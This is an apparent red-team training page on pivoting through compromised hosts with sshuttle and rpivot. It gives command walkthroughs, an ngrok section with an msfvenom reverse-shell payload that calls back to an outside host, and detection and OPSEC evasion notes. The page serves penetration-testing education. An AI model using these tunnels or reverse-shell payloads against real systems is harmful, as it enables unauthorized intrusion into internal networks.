---
layout: training-page
title: "sshuttle & rpivot — Red Team Academy"
module: "Pivoting & Tunneling"
tags:
  - sshuttle
  - rpivot
  - transparent-proxy
  - web-pivoting
page_key: "pivoting-sshuttle-rpivot"
render_with_liquid: false
---

# sshuttle & rpivot

## Overview

sshuttle and rpivot solve the same problem from different angles: routing your attack traffic through a pivot host when you don't have raw TCP tunneling available. sshuttle uses SSH as its transport and creates a transparent proxy — no proxychains, no SOCKS configuration, all your tools work as if directly on the target network. rpivot uses HTTP as its transport, which is useful when HTTP CONNECT is the only outbound path, including through corporate proxies with NTLM authentication.

Use sshuttle when SSH is available (fastest, most transparent). Use rpivot when only HTTP egress exists. For environments with neither, see Chisel (HTTP) or Ligolo-ng (TUN interface).

![sshuttle transparent proxy via SSH versus rpivot reverse HTTP CONNECT SOCKS proxy: two different approaches to routing traffic through a pivot host](/images/pivoting/sshuttle-rpivot.svg)  
*// sshuttle vs rpivot — transparent proxy vs reverse http socks pivoting*

## sshuttle — Transparent Proxy via SSH

sshuttle creates a transparent VPN-like connection through an SSH session without requiring root on the remote host (only on your local machine). Unlike SSH dynamic forwarding, sshuttle transparently proxies all TCP traffic to a subnet — no proxychains required. It uses iptables/pf rules on your attack box to intercept and forward traffic.

```
# Install sshuttle:
sudo apt install sshuttle
# or: pip3 install sshuttle

# Basic usage — route entire subnet through pivot:
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/24 -v
# -r: remote SSH host
# 172.16.5.0/24: subnet to route through the pivot
# -v: verbose

# Route multiple subnets:
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/24 192.168.10.0/24 -v

# Route all traffic (0.0.0.0/0) — full tunnel mode:
sudo sshuttle -r ubuntu@10.129.202.64 0.0.0.0/0 -v
# Excludes the pivot's IP automatically to avoid loop

# With SSH key:
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/24 --ssh-cmd "ssh -i ~/.ssh/pivot_key"
```

## sshuttle with Specific Subnet Routing

Control exactly which subnets route through the tunnel versus using your normal routing. The `--exclude` flag lets you keep certain ranges on the local path.

```
# Route one subnet, explicitly exclude another:
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/24 --exclude 172.16.5.100

# Route internal ranges but exclude the pivot's own IP (prevent routing loop):
sudo sshuttle -r ubuntu@10.129.202.64 172.16.0.0/16 --exclude 10.129.202.64

# Route multiple specific subnets (space-separated):
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/24 172.16.6.0/24 10.10.10.0/24

# Exclude a range you don't want tunneled:
sudo sshuttle -r ubuntu@10.129.202.64 172.16.0.0/12 \
    --exclude 172.16.5.200 \
    --exclude 172.16.5.201

# Use CIDR notation to tighten scope:
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/28
# Routes only 172.16.5.0 - 172.16.5.15

# Check what iptables rules sshuttle installs (on your attack box):
sudo iptables -t nat -L OUTPUT -n -v
```

## sshuttle DNS Forwarding

By default, sshuttle routes TCP only. DNS queries may still go to your local resolver. Use `--dns` to redirect DNS through the tunnel for internal name resolution.

```
># Route DNS through the tunnel:
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/24 --dns -v

# Exclude specific hosts from routing (e.g., exclude the pivot itself):
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/24 --exclude 10.129.202.64

# Using a custom SSH port:
sudo sshuttle -r ubuntu@10.129.202.64:2222 172.16.5.0/24 -v

# Background mode:
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/24 -D
# -D: daemonize

# Check active sshuttle:
ps aux | grep sshuttle
sudo iptables -t nat -L OUTPUT | grep -i redirect
```

## sshuttle Without Root

sshuttle normally requires root on your attack box to install iptables rules. The `--method` flag lets you choose the interception method — some work without root.

```
# Default method (iptables NAT — requires root):
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/24

# tproxy method (Linux transparent proxy — requires root, more flexible):
sudo sshuttle --method tproxy -r ubuntu@10.129.202.64 172.16.5.0/24
# tproxy supports UDP in addition to TCP

# pf method (macOS/BSD — uses pf firewall, requires root):
sudo sshuttle --method pf -r ubuntu@10.129.202.64 172.16.5.0/24

# nat method (explicit iptables NAT — same as default):
sudo sshuttle --method nat -r ubuntu@10.129.202.64 172.16.5.0/24

# nft method (nftables — modern Linux alternative to iptables):
sudo sshuttle --method nft -r ubuntu@10.129.202.64 172.16.5.0/24

# Running without root entirely — use SOCKS fallback mode:
# sshuttle can work in SOCKS mode where it opens a local SOCKS proxy
# without iptables (requires proxychains for non-proxy-aware tools):
sshuttle -r ubuntu@10.129.202.64 172.16.5.0/24 --listen 127.0.0.1:1080
# Then use: curl --socks5 127.0.0.1:1080 http://172.16.5.100
```

## sshuttle via SSH Private Key and Non-Standard Port

```
># Full options example:
sudo sshuttle \
  -r ubuntu@10.129.202.64 \
  172.16.5.0/24 \
  --ssh-cmd "ssh -i ~/.ssh/id_rsa -p 2222 -o StrictHostKeyChecking=no" \
  --dns \
  -v

# From a compromised Windows host that has Python + openssh:
# sshuttle requires Python on the remote host (checks for python3 or python)
# Verify: python3 --version  (on pivot)

# If Python unavailable on pivot, use --no-latency-control:
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/24 --no-latency-control
```

## rpivot — Web Server Reverse Pivot

rpivot is a Python-based reverse SOCKS proxy designed for restricted environments where the target can reach your server via HTTP but not raw TCP. The server runs on your attack box; the client runs on the pivot and connects out via HTTP CONNECT, creating a SOCKS4 proxy on your machine.

```
># Clone rpivot:
git clone https://github.com/klsecservices/rpivot.git

# ── Attack Box (rpivot SERVER) ────────────────────────────────
# Start rpivot server:
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
# --proxy-port: SOCKS4 proxy port on localhost
# --server-port: port clients connect to
# --server-ip: listen address

# ── Pivot Host (rpivot CLIENT) ────────────────────────────────
# Transfer client to pivot:
scp rpivot/client.py ubuntu@10.129.202.64:/tmp/

# Connect to rpivot server:
python2.7 client.py --server-ip 10.10.14.5 --server-port 9999

# ── Attack Box — use the proxy ────────────────────────────────
# Configure proxychains for SOCKS4 (rpivot creates SOCKS4, not SOCKS5):
# /etc/proxychains.conf:
# socks4 127.0.0.1 9050

proxychains nmap -sT -p 80,443,445 172.16.5.0/24
proxychains curl http://172.16.5.100
```

## rpivot Through Corporate HTTP Proxy

rpivot can tunnel through a corporate HTTP CONNECT proxy — useful when the pivot must use the corporate proxy to reach the internet.

```
># Client via corporate HTTP proxy:
python2.7 client.py \
  --server-ip 10.10.14.5 \
  --server-port 9999 \
  --ntlm-proxy-ip 172.16.5.1 \
  --ntlm-proxy-port 8080 \
  --domain CORP \
  --username proxyuser \
  --password 'ProxyPass123!'

# Without NTLM (basic proxy):
python2.7 client.py \
  --server-ip 10.10.14.5 \
  --server-port 9999 \
  --proxy-ip 172.16.5.1 \
  --proxy-port 3128
```

## rpivot Server and Client Setup for HTTP CONNECT Tunnel

A complete rpivot deployment for scenarios where HTTP is the only allowed egress.

```
# Verify python2.7 is available on pivot:
python2.7 --version

# If only Python3 is available, a Python3-compatible fork exists:
# https://github.com/p3nt4/rpivot  (Python3 branch)

# ── Attack Box ────────────────────────────────────────────────
git clone https://github.com/klsecservices/rpivot.git
cd rpivot

# Start server — binds SOCKS4 on :9050, listens for clients on :9999:
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# ── Pivot Host ────────────────────────────────────────────────
# Upload client.py to pivot (via file transfer, web delivery, etc.)
python2.7 client.py --server-ip 10.10.14.5 --server-port 9999

# ── Attack Box — verify and use ───────────────────────────────
# SOCKS4 proxy is now at 127.0.0.1:9050
# /etc/proxychains4.conf:
# socks4  127.0.0.1  9050

# Test connectivity:
proxychains curl http://172.16.5.100

# rpivot SOCKS4 supports TCP only — no UDP
# For tools that require SOCKS5, use Chisel or SSH -D instead
```

## Comparing sshuttle vs Chisel vs rpivot Use Cases

```
># Tool comparison for different scenarios:

┌──────────────┬─────────────────────────────────────────┬──────────────────────┐
│ Tool         │ Best Use Case                           │ Requires             │
├──────────────┼─────────────────────────────────────────┼──────────────────────┤
│ sshuttle     │ Fast transparent proxy, SSH available   │ Python on pivot,     │
│              │ No proxychains needed                   │ root on attack box   │
├──────────────┼─────────────────────────────────────────┼──────────────────────┤
│ Chisel       │ No SSH, HTTP-based, cross-platform      │ Binary on pivot      │
│              │ Works through HTTP proxies              │                      │
├──────────────┼─────────────────────────────────────────┼──────────────────────┤
│ rpivot       │ HTTP CONNECT only, strict egress        │ Python 2.7 on pivot  │
│              │ Can use corporate proxy with NTLM       │                      │
├──────────────┼─────────────────────────────────────────┼──────────────────────┤
│ SSH -D       │ Quick SOCKS5, SSH available             │ SSH to pivot         │
│              │ Simple, no extra tools                  │ proxychains on       │
│              │                                         │ attack box           │
└──────────────┴─────────────────────────────────────────┴──────────────────────┘

# Decision flow:
# SSH available?         → ssh -D or sshuttle
# HTTP only outbound?    → Chisel (HTTP transport) or rpivot
# Corporate proxy?       → rpivot with --ntlm-proxy
# No Python, need speed? → Chisel (Go binary, fast)
# Full transparent VPN?  → sshuttle (no proxychains needed)
```

## ngrok — Quick Reverse Tunnel Overview

ngrok and similar commercial services expose a local port through their cloud infrastructure — useful for quickly catching reverse shells from egress-filtered targets without managing a VPS. See the dedicated ngrok page for full coverage.

```
# Quick use case: catch a reverse shell through ngrok
# On attack box — expose port 4444 via ngrok TCP tunnel:
ngrok tcp 4444
# ngrok returns: tcp://0.tcp.ngrok.io:XXXXX → localhost:4444

# Start your listener:
nc -lvnp 4444

# Generate payload pointing to ngrok address:
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=0.tcp.ngrok.io LPORT=XXXXX \
    -f exe -o shell.exe

# Payload callbacks through ngrok → your netcat listener
# No firewall rules, VPS, or port forwarding needed

# When to use ngrok vs sshuttle/rpivot:
# ngrok: one-off reverse shell catch, no infrastructure required
# sshuttle/rpivot: persistent pivot to internal network segment, tool routing
```

## Detection and OPSEC Notes

Both tools leave detectable traces. sshuttle modifies iptables rules on your attack box, and rpivot sends HTTP traffic through the pivot. Understand what's visible before deploying in a monitored environment.

```
# sshuttle detection:
# - Creates iptables NAT rules on your attack box (local, not visible to target)
# - Appears as normal SSH connection from your attack box to pivot
# - SSH session will have elevated data volume (all proxied traffic)
# - Monitor: watch for long-lived SSH sessions with unusual data patterns
# - Defense evasion: use non-standard SSH port, blend with legitimate SSH traffic

# sshuttle requires Python3 on the remote host — it uploads a small bootstrap
# script via SSH at connection time. Check what lands on the pivot:
# /tmp/sshuttle-*.py  — the server-side component
# This file is cleaned up on disconnect, but shows up in auditd/syslog

# rpivot detection:
# - Outbound HTTP/HTTPS to unusual external IPs from internal host
# - HTTP CONNECT requests from internal host (if using proxy)
# - Persistent long-lived HTTP connection (not typical browser behavior)
# - DNS lookups for your server's IP around time of connection
# - rpivot uses Python 2.7 — unusual in modern environments
# - Network anomaly: single host sending HTTP to an IP with no hostname

# OPSEC recommendations:
# - Deploy C2/pivot infrastructure on dedicated IPs, not shared hosting
# - Use HTTPS for rpivot if possible (reduces content inspection visibility)
# - For sshuttle: restrict iptables rule to needed subnet only (not 0.0.0.0/0)
# - Tear down tunnels when not actively using them
```

## Resources

- sshuttle — https://github.com/sshuttle/sshuttle
- sshuttle documentation — https://sshuttle.readthedocs.io/
- rpivot — https://github.com/klsecservices/rpivot
- ngrok — https://ngrok.com (see ngrok-tunneling page for full coverage)
- MITRE T1572 — Protocol Tunneling
- MITRE T1090 — Proxy
